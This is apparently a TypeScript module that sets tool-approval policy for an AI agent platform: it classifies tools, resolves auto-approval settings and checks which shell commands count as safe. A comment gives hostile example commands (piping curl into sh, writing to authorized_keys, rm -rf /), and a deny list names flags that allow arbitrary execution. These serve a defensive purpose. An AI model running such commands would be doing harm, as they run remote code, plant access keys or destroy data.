import { KLETRON_ADMIN_TOOL_NAMES } from "@kletron/agent-core/tools/kletronAdminToolNames";

const KLETRON_ADMIN_TOOL_SET_EARLY = new Set(
    KLETRON_ADMIN_TOOL_NAMES.map((n) => String(n).trim().toLowerCase()),
);
import type { ThreadApprovalMode } from "@kletron/shared/threadApprovalTypes";
import { normalizeToWorkModeId, WORK_MODES } from "@kletron/shared/workMode";

export type ToolApprovalConfig = {
    autoApproveReadonlySources: string[];
    neverAutoApproveTools: string[];
    autoApproveSafeBash: boolean;
    toolOverrides: Record<string, "always_approve" | "always_require" | "default">;
    /** Default thread mode for new agent sessions (workspace setting; not used by policy resolution). */
    defaultThreadApprovalMode?: ThreadApprovalMode;
};

/* ═══════════════════════════════════════════════════════════════════════════
 * Tool Approval Config resolution
 *
 * Resolution order:
 *   1. Injected override (set by server at startup from MongoDB)
 *   2. Environment variables (backward compat)
 *   3. Built-in defaults
 *
 * The injectable pattern avoids eagerly importing config.ts (which would
 * trigger dotenv + MongoDB connections at import time). The server calls
 * setToolApprovalConfigOverride() once after loading persisted config.
 * ═══════════════════════════════════════════════════════════════════════════ */

let _configOverride: ToolApprovalConfig | null = null;

/** Inject persisted config (called by server after loading from MongoDB). */
export function setToolApprovalConfigOverride(config: ToolApprovalConfig): void {
    _configOverride = config;
}

/** Clear injected config (for tests). */
export function clearToolApprovalConfigOverride(): void {
    _configOverride = null;
}

function resolveToolApprovalConfig(): ToolApprovalConfig {
    // 1. Injected override (from server persisted config)
    if (_configOverride) return _configOverride;

    // 2. Environment variables
    const envSources = process.env.AUTO_APPROVE_READONLY_SOURCES;
    const envNever = process.env.NEVER_AUTO_APPROVE_TOOLS;
    const envSafeBash = process.env.AUTO_APPROVE_SAFE_BASH;

    return {
        autoApproveReadonlySources: envSources
            ? envSources.split(",").map((s) => s.trim().toLowerCase()).filter(Boolean)
            : ["agent", "automation"],
        neverAutoApproveTools: envNever
            ? envNever.split(",").map((s) => s.trim().toLowerCase()).filter(Boolean)
            : [],
        autoApproveSafeBash: envSafeBash !== undefined
            ? envSafeBash.trim().toLowerCase() === "true"
            : true,
        toolOverrides: {},
    };
}

export type NormalizedRunSource = "agent" | "automation" | "channel" | "unknown";

export type ToolClass = "readonly" | "execution" | "write_repo" | "unknown";

export type ToolApprovalDecision = "auto_approve" | "requires_approval" | "deny";

export type ToolApprovalPolicyInput = {
    source?: string;
    toolName: string;
    /** For execution tools like execute_bash, the command string for safe-command detection */
    command?: string;
    /** When `work`, tools not in the Work allowlist are denied. */
    workMode?: string | null;
    /** When set, uses this snapshot instead of the process singleton / env defaults (per-tenant runs). */
    approvalConfig?: ToolApprovalConfig;
};

export type ToolApprovalPolicyResult = {
    source: string;
    normalizedSource: NormalizedRunSource;
    toolName: string;
    toolClass: ToolClass;
    decision: ToolApprovalDecision;
    reason: string;
};

export const READONLY_TOOLS = new Set<string>([
    "glob_files",
    "list_files",
    "read_file",
    "read_file_range",
    "search_code",
    "repo_metrics",
    "dependency_info",
    "describe_structure",
    "git_log",
    "git_diff",
    "git_grep",
    "git_blame",
    "semantic_code_search",
    "structural_search",
    "symbols_list",
    "find_symbol",
    "go_to_definition",
    "references",
    "todo_search",
    "bootstrap_context",
    "web_search",
    "fetch_url",
    "github_api",
    "sentry_api",
    "gmail_list_labels",
    "gmail_search_messages",
    "gmail_read_message",
    "calendar_list_calendars",
    "calendar_freebusy",
    "calendar_list_events",
    "calendar_get_event",
    "drive_list_files",
    "drive_read_file",
    "output_format",
    "locate_ui_feature",
    "write_todos",
    "list_available_skills",
    "list_all_skills",
    "list_skills",
    "load_skill",
    // `task` spawns a read-only subagent (write/exec tools are stripped in
    // `subagentRunner`), so it has no side effects the user must approve.
    "task",
]);

export const EXECUTION_TOOLS = new Set<string>([
    "execute_bash",
]);

export const WRITE_REPO_TOOLS = new Set<string>(["write_file", "str_replace_editor"]);

/**
 * Safe command prefixes — read-only commands with no side effects.
 * Used for auto-approval when autoApproveSafeBash is enabled.
 *
 * `env` / `printenv` are deliberately absent: the command runs with the
 * agent host's environment, so dumping it discloses every configured secret.
 */
const SAFE_COMMAND_PREFIXES = [
    "ls", "cat", "head", "tail", "wc", "find", "grep", "rg",
    "echo", "pwd", "which", "whoami", "date",
    "file", "stat", "du", "df", "uname", "type",
    "node --version", "node -v", "npm --version", "npm -v",
    "npx --version", "npx -v", "pnpm --version",
    "git status", "git log", "git diff", "git branch",
    "git show", "git blame", "git remote", "git tag",
];

/**
 * Shell syntax that lets an otherwise-safe prefix run arbitrary code or write
 * to disk. The command string is handed to `bash -c` verbatim, so any of these
 * appearing anywhere in it voids the prefix check:
 *
 *   echo $(curl http://x | sh)      — substitution runs before echo does
 *   echo `id`                       — same, backtick form
 *   echo pwned > ~/.ssh/authorized_keys — redirection writes
 *   ls; rm -rf /                    — chaining
 *
 * Every command-substitution form in bash needs either a backtick or a paren
 * — `$(…)`, `` `…` ``, `$((…))`, `<(…)`, `>(…)` — so rejecting those plus the
 * redirection and chaining operators closes the whole class. Bare `$VAR`
 * expansion stays allowed: its result lands in an argument, never in command
 * position.
 *
 * Detection is intentionally quote-blind. A safe command that merely mentions
 * one of these characters inside a quoted literal is sent for approval instead
 * of being auto-approved, which is the direction that fails safe.
 */
const UNSAFE_SHELL_SYNTAX = /[`><;&\n\r()]/;

/**
 * Flags that turn a read-only lookup into a write or an arbitrary-exec
 * primitive, keyed by the command they belong to.
 */
const DANGEROUS_FLAGS_BY_COMMAND: Record<string, readonly string[]> = {
    // -exec/-ok run arbitrary binaries; -delete and the -f* actions write.
    find: ["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprintf", "-fls"],
    // --pre and --hostname-bin make ripgrep spawn a caller-supplied program.
    rg: ["--pre", "--hostname-bin"],
};

/** Split on pipes only — every other operator is already rejected outright. */
const splitPipeline = (command: string): string[] =>
    command.split("|").map((segment) => segment.trim()).filter(Boolean);

const isSafeSegment = (segment: string): boolean => {
    // Strip leading env var assignments (e.g. "FOO=bar ls")
    const withoutEnvVars = segment.replace(/^(\w+=\S+\s+)+/, "").trim();
    if (!withoutEnvVars) return false;

    const matchesPrefix = SAFE_COMMAND_PREFIXES.some(
        (prefix) => withoutEnvVars === prefix || withoutEnvVars.startsWith(prefix + " ")
    );
    if (!matchesPrefix) return false;

    const [command, ...args] = withoutEnvVars.split(/\s+/);
    const dangerous = DANGEROUS_FLAGS_BY_COMMAND[command];
    if (dangerous && args.some((arg) => dangerous.includes(arg))) {
        return false;
    }

    return true;
};

/**
 * Checks if a command is safe (read-only, no side effects).
 *
 * Every segment of a pipeline must independently be safe — `ls | sh` is not
 * safe just because `ls` is — and the command must contain no shell syntax
 * capable of substitution, redirection or chaining.
 *
 * This is an allowlist over a string that still reaches `bash -c`. It is a
 * guard against an agent auto-approving something destructive, not a sandbox;
 * untrusted input still belongs in an isolated execution environment.
 */
export const isSafeCommand = (command: string): boolean => {
    const trimmed = String(command ?? "").trim();
    if (!trimmed) return false;
    if (UNSAFE_SHELL_SYNTAX.test(trimmed)) return false;

    const segments = splitPipeline(trimmed);
    if (segments.length === 0) return false;

    return segments.every(isSafeSegment);
};

export const normalizeRunSource = (source?: string): NormalizedRunSource => {
    const normalized = String(source ?? "").trim().toLowerCase();
    if (normalized === "agent") return "agent";
    if (normalized === "automation") return "automation";
    if (normalized.startsWith("channel:")) return "channel";
    return "unknown";
};

/** Kletron admin tools whose names indicate read-only workspace queries (`list_*`, `get_*`). */
export function isKletronReadonlyAdminToolName(toolName: string): boolean {
    const t = String(toolName ?? "").trim().toLowerCase();
    return /^kletron_(list|get)_/.test(t);
}

export const classifyTool = (toolName: string): ToolClass => {
    const normalizedToolName = String(toolName).trim().toLowerCase();
    if (READONLY_TOOLS.has(normalizedToolName)) return "readonly";
    if (EXECUTION_TOOLS.has(normalizedToolName)) return "execution";
    if (WRITE_REPO_TOOLS.has(normalizedToolName)) return "write_repo";
    if (isKletronReadonlyAdminToolName(normalizedToolName)) return "readonly";
    return "unknown";
};

/**
 * External MCP tools exposed as `serverSlug__toolName` (double underscore).
 * Work mode uses a small fixed allowlist; namespaced MCP tools must still pass
 * so connectors (e.g. Hunter) work in Work threads.
 */
export function isNamespacedExternalMcpToolName(toolName: string): boolean {
    const t = String(toolName ?? "").trim().toLowerCase();
    return /^[a-z0-9][a-z0-9_-]{0,63}__[a-z0-9][a-z0-9_-]{0,127}$/.test(t);
}

/** Legacy graph / client alias → canonical MCP tool id. */
export function canonicalAgentToolName(toolName: string): string {
    const t = String(toolName ?? "").trim().toLowerCase();
    return t === "find_references" ? "references" : t;
}

export const getToolApprovalPolicy = (input: ToolApprovalPolicyInput): ToolApprovalPolicyResult => {
    const toolName = canonicalAgentToolName(String(input.toolName ?? ""));
    const source = String(input.source ?? "");
    const normalizedSource = normalizeRunSource(source);
    const toolClass = classifyTool(toolName);

    const mode = normalizeToWorkModeId(input.workMode ?? "code");
    if (mode === "work") {
        const allowed = new Set(
            WORK_MODES.work.availableTools.map((t) => t.trim().toLowerCase()),
        );
        if (
            !KLETRON_ADMIN_TOOL_SET_EARLY.has(toolName) &&
            !allowed.has(toolName) &&
            !isNamespacedExternalMcpToolName(toolName)
        ) {
            return {
                source,
                normalizedSource,
                toolName,
                toolClass,
                decision: "deny",
                reason: `Tool "${toolName}" is not available in Work mode.`,
            };
        }
    }

    const cfg: ToolApprovalConfig = input.approvalConfig ?? resolveToolApprovalConfig();

    const autoApproveReadonlySources = new Set(cfg.autoApproveReadonlySources);
    const neverAutoApproveTools = new Set(cfg.neverAutoApproveTools);

    // ── 1. Per-tool override (highest priority) ─────────────────────────
    const toolOverride = cfg.toolOverrides?.[toolName];
    if (toolOverride === "always_approve") {
        return {
            source,
            normalizedSource,
            toolName,
            toolClass,
            decision: "auto_approve",
            reason: `Tool override: "${toolName}" is configured as always_approve.`,
        };
    }
    if (toolOverride === "always_require") {
        return {
            source,
            normalizedSource,
            toolName,
            toolClass,
            decision: "requires_approval",
            reason: `Tool override: "${toolName}" is configured as always_require.`,
        };
    }

    // ── 2. Never-auto-approve list ──────────────────────────────────────
    if (neverAutoApproveTools.has(toolName)) {
        return {
            source,
            normalizedSource,
            toolName,
            toolClass,
            decision: "requires_approval",
            reason: "Tool is explicitly configured to never auto-approve.",
        };
    }

    // ── 3. Readonly tools ───────────────────────────────────────────────
    if (toolClass === "readonly") {
        if (autoApproveReadonlySources.has(normalizedSource)) {
            return {
                source,
                normalizedSource,
                toolName,
                toolClass,
                decision: "auto_approve",
                reason: `Read-only tool auto-approved for source "${normalizedSource}".`,
            };
        }
        return {
            source,
            normalizedSource,
            toolName,
            toolClass,
            decision: "requires_approval",
            reason: `Read-only tool requires approval for source "${normalizedSource}".`,
        };
    }

    // ── 4. Execution tools (execute_bash) ───────────────────────────────
    if (toolClass === "execution") {
        if (
            cfg.autoApproveSafeBash &&
            typeof input.command === "string" &&
            isSafeCommand(input.command) &&
            autoApproveReadonlySources.has(normalizedSource)
        ) {
            return {
                source,
                normalizedSource,
                toolName,
                toolClass,
                decision: "auto_approve",
                reason: `Execution tool auto-approved: safe command detected for source "${normalizedSource}".`,
            };
        }
        return {
            source,
            normalizedSource,
            toolName,
            toolClass,
            decision: "requires_approval",
            reason: "Execution tools require approval unless command is safe and autoApproveSafeBash is enabled.",
        };
    }

    // ── 5. Write-repo tools ─────────────────────────────────────────────
    if (toolClass === "write_repo") {
        return {
            source,
            normalizedSource,
            toolName,
            toolClass,
            decision: "requires_approval",
            reason: "Repository write tools are never auto-approved.",
        };
    }

    // ── 6. Unknown tools ────────────────────────────────────────────────
    return {
        source,
        normalizedSource,
        toolName,
        toolClass,
        decision: "requires_approval",
        reason: "Unknown tool class defaults to requiring approval.",
    };
};

const KLETRON_ADMIN_TOOL_SET = new Set(
    KLETRON_ADMIN_TOOL_NAMES.map((n) => String(n).trim().toLowerCase())
);

export function isKletronAdminToolName(toolName: string): boolean {
    return KLETRON_ADMIN_TOOL_SET.has(String(toolName ?? "").trim().toLowerCase());
}

/**
 * Applies per-thread (AgentGraphRun) approval mode on top of workspace policy.
 * Automation runs ignore thread modes (caller should pass mode only for interactive agent).
 *
 * `full_auto_thread`: promotes `requires_approval` → `auto_approve` except workspace
 * never-auto list and per-tool `always_require`. No separate carve-out for Kletron tools.
 */
export function applyThreadApprovalOverride(
    base: ToolApprovalPolicyResult,
    input: { mode: ThreadApprovalMode | undefined; toolName: string; approvalConfig?: ToolApprovalConfig }
): ToolApprovalPolicyResult {
    const mode: ThreadApprovalMode = input.mode ?? "inherit";
    if (mode === "inherit") return base;
    if (base.normalizedSource === "automation") return base;
    if (base.decision === "deny") return base;

    const tool = String(input.toolName ?? "").trim().toLowerCase();
    const cfg = input.approvalConfig ?? resolveToolApprovalConfig();
    const never = new Set(cfg.neverAutoApproveTools.map((t) => t.trim().toLowerCase()).filter(Boolean));
    const override = cfg.toolOverrides?.[tool];

    if (mode === "confirm_everything") {
        if (base.decision === "auto_approve") {
            return {
                ...base,
                decision: "requires_approval",
                reason: `Thread mode confirm_everything: approval required (${base.reason})`,
            };
        }
        return base;
    }

    if (mode === "full_auto_thread") {
        if (base.decision !== "requires_approval") return base;
        if (never.has(tool)) return base;
        if (override === "always_require") return base;
        return {
            ...base,
            decision: "auto_approve",
            reason: `Thread mode full_auto_thread: auto-approved (${base.reason})`,
        };
    }

    return base;
}
